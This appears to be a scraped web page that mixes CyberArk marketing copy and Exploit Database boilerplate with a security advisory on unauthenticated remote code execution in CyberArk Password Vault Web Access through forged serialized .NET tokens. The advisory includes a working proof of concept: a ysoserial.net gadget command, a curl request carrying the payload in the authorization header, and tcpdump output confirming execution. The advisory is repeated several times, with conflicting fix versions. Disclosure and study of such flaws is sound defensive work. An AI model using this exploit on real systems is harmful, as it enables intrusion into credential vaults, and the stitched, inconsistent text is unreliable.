![](https://www.cyberark.com/wp-content/uploads/2023/05/overview-img-1.svg)

#### Seamless & secure access for all identities

By combining secure SSO, Adaptive MFA, Lifecycle Management, Directory Services and User Behavior Analytics, we help you streamline operations and give users simple and secure access to resources—on-premises, cloud, hybrid—from any location, using any device.

![](https://www.cyberark.com/wp-content/uploads/2023/05/overview-img-2.svg)

#### Intelligent privilege controls

Apply world-class intelligent privilege controls across the IT estate, as well as differentiated controls to secure the unique needs of workforce users, third-party vendors, endpoints and machine identities as they access sensitive data.

![](https://www.cyberark.com/wp-content/uploads/2023/05/overview-img-3.svg)

#### Flexible identity automation & orchestration

Streamline HR processes, ensure users have the right access to the right resources, enable compliance with industry or government regulations, and improve efficiencies across the board with orchestration and lifecycle management, permissions and entitlements, and directory and federation services.

### Identity Security Defined

Centered on intelligent privilege controls, identity security seamlessly secures access for all identities and flexibly automates the identity lifecycle with continuous threat detection and prevention — all with a unified approach.

## Apply intelligent privilege controls across the entire identity lifecycle

##### Expand intelligent privilege controls that were designed for the most privileged user, such as an admin, to a broader range of human and machine identities, whenever standing or just-in-time access is required.

[![](https://www.cyberark.com/wp-content/uploads/2023/05/card-icon-1.svg)

#### Workforce & Customer Access

Ensure that the right users have secure access to the right resources at the right times, by protecting workforce and customer credentials and tightly controlling access to on-premises and cloud-based applications, services and IT infrastructure.

## CyberArk Password Vault Web Access Remote Code Execution

The CyberArk Password Vault Web Access application uses authentication
tokens which consist of serialized .NET objects. By crafting manipulated
tokens, attackers are able to gain unauthenticated remote code execution
on the web server.

### Details

### Introduction

“CyberArk Enterprise Password Vault is designed to secure, rotate and
control access to privileged account credentials based on organizational
policies. A flexible architecture allows organizations to start small
and scale to the largest, most complex IT environments. The solution
protects privileged account credentials used to access the vast majority
of systems.”
(from the Enterprise Password Vault Data Sheet (<http://lp.cyberark.com/rs/316-CZP-275/images/ds-enterprise-password-vault-11-15-17.pdf>))

### More Details

The CyberArk Password Vault provides secure storage for credentials. It
may be accessed through various clients which are also provided by
CyberArk. One such client is the CyberArk Password Vault Web Access, a
.NET web application. After logging into the web application with their
credentials, users may access credentials kept in the vault.
Additionally, CyberArk Password Vault Web Access provides a REST API for
programmatic access to the vault. This API is available at an URL
similar to the following:

`https://10.0.0.6/PasswordVault/WebServices/`

The API provides multiple endpoints with different methods.
Most methods provided by the API require prior authentication.
Consequently, a user’s API call must include an authentication token in
an HTTP authorization header. Tokens may be generated by calling a
dedicated “Logon” API method.

Analysis of this token by RedTeam Pentesting revealed, that it consists
of a base64 encoded, serialized .NET object of the type
“CyberArk.Services.Web.SessionIdentifiers”. This class consists of four
string attributes which hold information about a user’s session. The
integrity of the serialized data is not protected. Therefore, attackers
may send arbitrary .NET objects to the API in the authorization header.
By leveraging certain gadgets, such as the ones provided by
ysoserial.net (<https://github.com/pwntester/ysoserial.net>), attackers may execute arbitrary code in the context
of the web application.

### Proof of Concept

First, a malicious serialized .NET object is created. Here the
“TypeConfuseDelegate” gadget of ysoserial.net is used to execute the
“ping” command:

```
$ ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 \
  -c "ping 10.0.0.19" > execute-ping.txt

$ cat execute-ping.txt

```

Next, an API call is invoked which includes the malicious .NET object in
its authorization header. This is done with cURL (<https://curl.haxx.se/>) as follows:

```
$ curl -s -X GET -k \
  --url 'https://10.0.0.6/PasswordVault/WebServices/PIMServices.svc/'\
  'Applications/?Location=\&IncludeSublocations=true' \
  --header "authorization: $(cat execute-ping.txt)" \
  --header 'content-type: application/json'

```

Simultaneously, tcpdump (<https://www.tcpdump.org/>) is invoked on the host 10.0.0.19 to listen
for ICMP packets originating from the web server:

```
$ sudo tcpdump -i enp0s25 icmp
tcpdump: verbose output suppressed[...]
listening on enp0s25[...]

IP 10.0.0.6 > 10.0.0.19: ICMP echo request, id 1, seq 6, length 40
IP 10.0.0.19 > 10.0.0.6: ICMP echo reply, id 1, seq 6, length 40

```

The fact that ICMP packets are received from the web server, indicates
that attacker-controlled code was executed.

### Workaround

Disable any access to the API at the route /PasswordVault/WebServices.

### Fix

Upgrade CyberArk Password Vault Web Access to version 9.9.5, 9.10.1 or
10.2.

### Security Risk

The risk of this vulnerability is rated as high. Attackers with access
to the PrivateArk Vault Web Access REST API may execute arbitrary code
on the web server. No credentials are required. Attackers gain access to
the system with the privileges of the web application. Consequently,
such access may be used to backdoor the web application and compromise
further accounts and credentials. Additionally, attackers may pivot from
the web server to attack the vault directly.

------------------------------------------------------------------------

Next, an API call is invoked which includes the malicious .NET object in
its authorization header. This is done with cURL [3] as follows:

------------------------------------------------------------------------
$ curl -s -X GET -k \
  --url 'https://10.0.0.6/PasswordVault/WebServices/PIMServices.svc/'\
  'Applications/?Location=\&IncludeSublocations=true' \
  --header "authorization: $(cat execute-ping.txt)" \
  --header 'content-type: application/json'
------------------------------------------------------------------------

Simultaneously, tcpdump [4] is invoked on the host 10.0.0.19 to listen
for ICMP packets originating from the web server:

------------------------------------------------------------------------
$ sudo tcpdump -i enp0s25 icmp
tcpdump: verbose output suppressed[...]
listening on enp0s25[...]

IP 10.0.0.6 > 10.0.0.19: ICMP echo request, id 1, seq 6, length 40
IP 10.0.0.19 > 10.0.0.6: ICMP echo reply, id 1, seq 6, length 40
------------------------------------------------------------------------

The fact that ICMP packets are received from the web server, indicates
that attacker-controlled code was executed.

Workaround
==========

Disable any access to the API at the route /PasswordVault/WebServices.

Fix
===

Upgrade CyberArk Password Vault Web Access to version 9.9.5, 9.10 or
10.2.

Security Risk
=============

The risk of this vulnerability is rated as high. Attackers with access
to the PrivateArk Vault Web Access REST API may execute arbitrary code
on the web server. No credentials are required. Attackers gain access to
the system with the privileges of the web application. Consequently,
such access may be used to backdoor the web application and compromise
further accounts and credentials. Additionally, attackers may pivot from
the web server to attack the vault directly.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### Introduction

“CyberArk Enterprise Password Vault is designed to secure, rotate and
control access to privileged account credentials based on organizational
policies. A flexible architecture allows organizations to start small
and scale to the largest, most complex IT environments. The solution
protects privileged account credentials used to access the vast majority
of systems.”
(from the Enterprise Password Vault Data Sheet (<http://lp.cyberark.com/rs/316-CZP-275/images/ds-enterprise-password-vault-11-15-17.pdf>))

### More Details

The CyberArk Password Vault provides secure storage for credentials. It
may be accessed through various clients which are also provided by
CyberArk. One such client is the CyberArk Password Vault Web Access, a
.NET web application. After logging into the web application with their
credentials, users may access credentials kept in the vault.
Additionally, CyberArk Password Vault Web Access provides a REST API for
programmatic access to the vault. This API is available at an URL
similar to the following:

`https://10.0.0.6/PasswordVault/WebServices/`

The API provides multiple endpoints with different methods.
Most methods provided by the API require prior authentication.
Consequently, a user’s API call must include an authentication token in
an HTTP authorization header. Tokens may be generated by calling a
dedicated “Logon” API method.

Analysis of this token by RedTeam Pentesting revealed, that it consists
of a base64 encoded, serialized .NET object of the type
“CyberArk.Services.Web.SessionIdentifiers”. This class consists of four
string attributes which hold information about a user’s session. The
integrity of the serialized data is not protected. Therefore, attackers
may send arbitrary .NET objects to the API in the authorization header.
By leveraging certain gadgets, such as the ones provided by
ysoserial.net (<https://github.com/pwntester/ysoserial.net>), attackers may execute arbitrary code in the context
of the web application.

### Proof of Concept

First, a malicious serialized .NET object is created. Here the
“TypeConfuseDelegate” gadget of ysoserial.net is used to execute the
“ping” command:

```
$ ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 \
  -c "ping 10.0.0.19" > execute-ping.txt

$ cat execute-ping.txt

```

Next, an API call is invoked which includes the malicious .NET object in
its authorization header. This is done with cURL (<https://curl.haxx.se/>) as follows:

```
$ curl -s -X GET -k \
  --url 'https://10.0.0.6/PasswordVault/WebServices/PIMServices.svc/'\
  'Applications/?Location=\&IncludeSublocations=true' \
  --header "authorization: $(cat execute-ping.txt)" \
  --header 'content-type: application/json'

```

Simultaneously, tcpdump (<https://www.tcpdump.org/>) is invoked on the host 10.0.0.19 to listen
for ICMP packets originating from the web server:

```
$ sudo tcpdump -i enp0s25 icmp
tcpdump: verbose output suppressed[...]
listening on enp0s25[...]

IP 10.0.0.6 > 10.0.0.19: ICMP echo request, id 1, seq 6, length 40
IP 10.0.0.19 > 10.0.0.6: ICMP echo reply, id 1, seq 6, length 40

```

The fact that ICMP packets are received from the web server, indicates
that attacker-controlled code was executed.

### Workaround

Disable any access to the API at the route /PasswordVault/WebServices.

### Fix

Upgrade CyberArk Password Vault Web Access to version 9.9.5, 9.10.1 or
10.2.

### Security Risk

The risk of this vulnerability is rated as high. Attackers with access
to the PrivateArk Vault Web Access REST API may execute arbitrary code
on the web server. No credentials are required. Attackers gain access to
the system with the privileges of the web application. Consequently,
such access may be used to backdoor the web application and compromise
further accounts and credentials. Additionally, attackers may pivot from
the web server to attack the vault directly.

Next, an API call is invoked which includes the malicious .NET object in
its authorization header. This is done with cURL [3] as follows:

------------------------------------------------------------------------
$ curl -s -X GET -k \
  --url '[https://10.0.0.6/PasswordVault/WebServices/PIMServices.svc/'\](https://10.0.0.6/PasswordVault/WebServices/PIMServices.svc/%27%5C)
  'Applications/?Location=\&IncludeSublocations=true' \
  --header "authorization: $(cat execute-ping.txt)" \
  --header 'content-type: application/json'
------------------------------------------------------------------------

Simultaneously, tcpdump [4] is invoked on the host 10.0.0.19 to listen
for ICMP packets originating from the web server:

------------------------------------------------------------------------
$ sudo tcpdump -i enp0s25 icmp
tcpdump: verbose output suppressed[...]
listening on enp0s25[...]

IP 10.0.0.6 > 10.0.0.19: ICMP echo request, id 1, seq 6, length 40
IP 10.0.0.19 > 10.0.0.6: ICMP echo reply, id 1, seq 6, length 40
------------------------------------------------------------------------

The fact that ICMP packets are received from the web server, indicates
that attacker-controlled code was executed.

Workaround
==========

Disable any access to the API at the route /PasswordVault/WebServices.

Fix
===

Upgrade CyberArk Password Vault Web Access to version 9.9.5, 9.10 or
10.2.

Security Risk
=============

The risk of this vulnerability is rated as high. Attackers with access
to the PrivateArk Vault Web Access REST API may execute arbitrary code
on the web server. No credentials are required. Attackers gain access to
the system with the privileges of the web application. Consequently,
such access may be used to backdoor the web application and compromise
further accounts and credentials. Additionally, attackers may pivot from
the web server to attack the vault directly.
